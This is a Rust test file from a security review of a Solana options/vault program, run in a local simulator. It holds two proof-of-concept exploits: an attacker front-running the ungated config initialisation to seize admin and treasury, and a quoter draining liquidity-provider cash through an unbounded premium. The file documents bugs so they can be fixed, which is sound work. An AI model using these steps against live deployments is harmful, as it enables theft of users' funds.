//! Security review proofs (docs/SECURITY_REVIEW.md). Each test PASSES when the
//! weakness it documents is present, so a fix should make it fail and be
//! flipped into a regression test.
use {
    anchor_lang::{
        prelude::{Clock, Pubkey},
        solana_program::instruction::Instruction,
        AccountDeserialize, InstructionData, ToAccountMetas,
    },
    hourly::{Config, KIND_DIGITAL},
    litesvm::LiteSVM,
    solana_keypair::Keypair,
    solana_message::{Message, VersionedMessage},
    solana_signer::Signer,
    solana_transaction::versioned::VersionedTransaction,
};

const TOKEN: Pubkey = anchor_spl::token::ID;
const SYSTEM: Pubkey = anchor_lang::system_program::ID;
const DAY: i64 = 86_400;
const T0: i64 = 1_791_158_400;
const FEED: [u8; 32] = [9u8; 32];
const SB_QUEUE: Pubkey = anchor_lang::pubkey!("EYiAmGSdsQTuCw413V5BzaruWuCCSDgTPtBGvLkXHbe7");
const USD: u64 = 1_000_000;

fn pack_mint(authority: &Pubkey, decimals: u8) -> Vec<u8> {
    let mut d = vec![0u8; 82];
    d[0..4].copy_from_slice(&1u32.to_le_bytes());
    d[4..36].copy_from_slice(authority.as_ref());
    d[44] = decimals;
    d[45] = 1;
    d
}

fn pack_token(mint: &Pubkey, owner: &Pubkey, amount: u64) -> Vec<u8> {
    let mut d = vec![0u8; 165];
    d[0..32].copy_from_slice(mint.as_ref());
    d[32..64].copy_from_slice(owner.as_ref());
    d[64..72].copy_from_slice(&amount.to_le_bytes());
    d[108] = 1;
    d
}

fn put_account(svm: &mut LiteSVM, key: Pubkey, data: Vec<u8>) {
    let lamports = svm.minimum_balance_for_rent_exemption(data.len());
    svm.set_account(key, solana_account::Account { lamports, data, owner: TOKEN, executable: false, rent_epoch: 0 })
        .unwrap();
}

fn token_account(svm: &mut LiteSVM, mint: &Pubkey, owner: &Pubkey, amount: u64) -> Pubkey {
    let k = Keypair::new().pubkey();
    put_account(svm, k, pack_token(mint, owner, amount));
    k
}

fn balance(svm: &LiteSVM, acct: &Pubkey) -> u64 {
    let a = svm.get_account(acct).unwrap();
    u64::from_le_bytes(a.data[64..72].try_into().unwrap())
}

fn send(svm: &mut LiteSVM, ixs: &[Instruction], payer: &Keypair, signers: &[&Keypair]) -> Result<(), String> {
    let bh = svm.latest_blockhash();
    let msg = Message::new_with_blockhash(ixs, Some(&payer.pubkey()), &bh);
    let mut uniq: Vec<&Keypair> = vec![];
    for k in signers {
        if !uniq.iter().any(|u| u.pubkey() == k.pubkey()) {
            uniq.push(k);
        }
    }
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg), &uniq).map_err(|e| e.to_string())?;
    let r = svm.send_transaction(tx).map(|_| ()).map_err(|e| format!("{:?} logs={:#?}", e.err, e.meta.logs));
    svm.expire_blockhash();
    r
}

fn set_time(svm: &mut LiteSVM, t: i64) {
    let mut c: Clock = svm.get_sysvar();
    c.unix_timestamp = t;
    svm.set_sysvar(&c);
}

fn read<T: AccountDeserialize>(svm: &LiteSVM, k: &Pubkey) -> T {
    let a = svm.get_account(k).unwrap();
    let mut d: &[u8] = &a.data;
    T::try_deserialize(&mut d).unwrap()
}

fn fresh_svm() -> LiteSVM {
    let mut svm = LiteSVM::new();
    let bytes = include_bytes!(concat!(env!("CARGO_TARGET_TMPDIR"), "/../deploy/hourly.so"));
    svm.add_program(hourly::id(), bytes).unwrap();
    set_time(&mut svm, T0);
    svm
}

fn init_config(svm: &mut LiteSVM, who: &Keypair, usdc: Pubkey, treasury: Pubkey, settler: Pubkey) -> Result<(), String> {
    let config = Pubkey::find_program_address(&[hourly::CONFIG_SEED], &hourly::id()).0;
    let ix = Instruction::new_with_bytes(
        hourly::id(),
        &hourly::instruction::InitConfig { settler, oracle_queue: SB_QUEUE, fee_bps: 500 }.data(),
        hourly::accounts::InitConfig { admin: who.pubkey(), config, quote_mint: usdc, treasury, system_program: SYSTEM }
            .to_account_metas(None),
    );
    send(svm, &[ix], who, &[who])
}

/// SR-M1: init_config has no gate. Whoever lands it first after the program is
/// deployed becomes admin, treasury, settler and picks the oracle queue.
#[test]
fn sr_m1_anyone_can_front_run_init_config() {
    let mut svm = fresh_svm();
    let attacker = Keypair::new();
    let team = Keypair::new();
    svm.airdrop(&attacker.pubkey(), 10_000_000_000).unwrap();
    svm.airdrop(&team.pubkey(), 10_000_000_000).unwrap();
    let usdc = Keypair::new().pubkey();
    put_account(&mut svm, usdc, pack_mint(&team.pubkey(), 6));
    let evil_treasury = token_account(&mut svm, &usdc, &attacker.pubkey(), 0);
    init_config(&mut svm, &attacker, usdc, evil_treasury, attacker.pubkey()).expect("attacker initialises config");
    let team_treasury = token_account(&mut svm, &usdc, &team.pubkey(), 0);
    assert!(init_config(&mut svm, &team, usdc, team_treasury, team.pubkey()).is_err(), "team locked out");
    let config = Pubkey::find_program_address(&[hourly::CONFIG_SEED], &hourly::id()).0;
    let c: Config = read(&svm, &config);
    assert_eq!(c.admin, attacker.pubkey());
    assert_eq!(c.settler, attacker.pubkey());
    assert_eq!(c.treasury, evil_treasury);
}

/// SR-H1: the vault quoter (a hot key on the venue server) sets `premium` with
/// no bound. One vault_buy of a single $1 contract at a premium equal to the
/// vault's cash moves every LP dollar to a colluding taker.
#[test]
fn sr_h1_quoter_drains_vault_with_unbounded_vault_buy_premium() {
    let mut svm = fresh_svm();
    let admin = Keypair::new();
    let quoter = Keypair::new();
    let accomplice = Keypair::new();
    let lp = Keypair::new();
    for k in [&admin, &quoter, &accomplice, &lp] {
        svm.airdrop(&k.pubkey(), 10_000_000_000).unwrap();
    }
    let usdc = Keypair::new().pubkey();
    put_account(&mut svm, usdc, pack_mint(&admin.pubkey(), 6));
    let treasury = token_account(&mut svm, &usdc, &admin.pubkey(), 0);
    let config = Pubkey::find_program_address(&[hourly::CONFIG_SEED], &hourly::id()).0;
    // 1% fee, like the venue
    let ix = Instruction::new_with_bytes(
        hourly::id(),
        &hourly::instruction::InitConfig { settler: admin.pubkey(), oracle_queue: SB_QUEUE, fee_bps: 100 }.data(),
        hourly::accounts::InitConfig { admin: admin.pubkey(), config, quote_mint: usdc, treasury, system_program: SYSTEM }
            .to_account_metas(None),
    );
    send(&mut svm, &[ix], &admin, &[&admin]).unwrap();

    // vault, 20% per-series cap
    let epoch: u32 = 1;
    let vault = Pubkey::find_program_address(&[hourly::LPV_SEED, config.as_ref(), &epoch.to_le_bytes()], &hourly::id()).0;
    let shares = Pubkey::find_program_address(&[hourly::LPV_SHARES_SEED, vault.as_ref()], &hourly::id()).0;
    let cash = Pubkey::find_program_address(&[hourly::LPV_CASH_SEED, vault.as_ref()], &hourly::id()).0;
    let ix = Instruction::new_with_bytes(
        hourly::id(),
        &hourly::instruction::CreateVault { epoch, quoter: quoter.pubkey(), deposit_end: T0 + DAY, epoch_end: T0 + 8 * DAY, max_series_bps: 2_000 }.data(),
        hourly::accounts::CreateVault { admin: admin.pubkey(), config, quote_mint: usdc, lp_vault: vault, share_mint: shares, cash, token_program: TOKEN, system_program: SYSTEM }
            .to_account_metas(None),
    );
    send(&mut svm, &[ix], &admin, &[&admin]).unwrap();

    // an LP deposits $1,000
    let lpq = token_account(&mut svm, &usdc, &lp.pubkey(), 1_000 * USD);
    let lps = token_account(&mut svm, &shares, &lp.pubkey(), 0);
    let ix = Instruction::new_with_bytes(
        hourly::id(),
        &hourly::instruction::VaultDeposit { amount: 1_000 * USD }.data(),
        hourly::accounts::VaultDeposit { depositor: lp.pubkey(), config, lp_vault: vault, share_mint: shares, cash, depositor_quote: lpq, depositor_shares: lps, token_program: TOKEN }
            .to_account_metas(None),
    );
    send(&mut svm, &[ix], &lp, &[&lp]).unwrap();

    // a $1 digital inside the epoch
    let u = { let mut u = [0u8; 16]; u[..8].copy_from_slice(b"H100_SXM"); u };
    let (strike, cap, units, expiry) = (2_700_000u64, USD, 1u64, T0 + 5 * DAY);
    let series = Pubkey::find_program_address(
        &[hourly::SERIES_SEED, config.as_ref(), &u, &[KIND_DIGITAL], &strike.to_le_bytes(), &cap.to_le_bytes(), &units.to_le_bytes(), &expiry.to_le_bytes()],
        &hourly::id(),
    ).0;
    let long_mint = Pubkey::find_program_address(&[hourly::LONG_SEED, series.as_ref()], &hourly::id()).0;
    let svault = Pubkey::find_program_address(&[hourly::VAULT_SEED, series.as_ref()], &hourly::id()).0;
    let ix = Instruction::new_with_bytes(
        hourly::id(),
        &hourly::instruction::CreateSeries { underlying: u, kind: KIND_DIGITAL, strike, cap, units, period_start: T0, expiry, feed_id: FEED }.data(),
        hourly::accounts::CreateSeries { admin: admin.pubkey(), config, quote_mint: usdc, series, long_mint, vault: svault, token_program: TOKEN, system_program: SYSTEM }
            .to_account_metas(None),
    );
    send(&mut svm, &[ix], &admin, &[&admin]).unwrap();

    // trading opens; the quoter "buys" one $1-max contract from the accomplice for $990
    set_time(&mut svm, T0 + DAY);
    let aq = token_account(&mut svm, &usdc, &accomplice.pubkey(), USD); // posts $1 collateral
    let premium = 990 * USD; // + 1% fee = $999.90 out of $1,000 of LP cash
    let vlong = Pubkey::find_program_address(&[hourly::LPV_LONG_SEED, vault.as_ref(), series.as_ref()], &hourly::id()).0;
    let vseries = Pubkey::find_program_address(&[hourly::LPV_SERIES_SEED, vault.as_ref(), series.as_ref()], &hourly::id()).0;
    let pos = Pubkey::find_program_address(&[hourly::POSITION_SEED, series.as_ref(), accomplice.pubkey().as_ref()], &hourly::id()).0;
    let ix = Instruction::new_with_bytes(
        hourly::id(),
        &hourly::instruction::VaultBuy { qty: 1, premium, quote_expiry: i64::MAX }.data(),
        hourly::accounts::VaultBuy {
            payer: admin.pubkey(), quoter: quoter.pubkey(), taker: accomplice.pubkey(), config, lp_vault: vault, cash, treasury,
            series, long_mint, vault: svault, taker_quote: aq, vault_long: vlong, position: pos, vault_series: vseries,
            token_program: TOKEN, system_program: SYSTEM,
        }
        .to_account_metas(None),
    );
    send(&mut svm, &[ix], &admin, &[&admin, &quoter, &accomplice]).expect("unbounded premium accepted");
    assert_eq!(balance(&svm, &aq), 990 * USD, "accomplice walks away with $990 for a contract worth at most $1");
    assert!(balance(&svm, &cash) <= USD, "LP cash drained: {}", balance(&svm, &cash));
}
